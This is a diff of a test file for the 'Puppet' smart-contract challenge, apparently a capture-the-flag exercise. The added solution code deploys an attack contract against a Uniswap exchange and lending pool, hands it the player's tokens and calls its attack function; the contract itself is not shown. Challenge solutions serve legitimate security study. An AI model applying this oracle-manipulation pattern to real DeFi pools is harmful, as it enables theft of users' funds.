@@ -95,6 +95,19 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // Deploy the attack contract
+        let attackPuppetPool = await (await ethers.getContractFactory('AttackPuppetPool', deployer)).deploy(
+            uniswapExchange.address,
+            lendingPool.address,
+            token.address,
+            player.address
+        );
+
+        await token.connect(player).transfer(attackPuppetPool.address, PLAYER_INITIAL_TOKEN_BALANCE);
+
+        await attackPuppetPool.attack({value: PLAYER_INITIAL_ETH_BALANCE});
+
     });
 
     after(async function () {
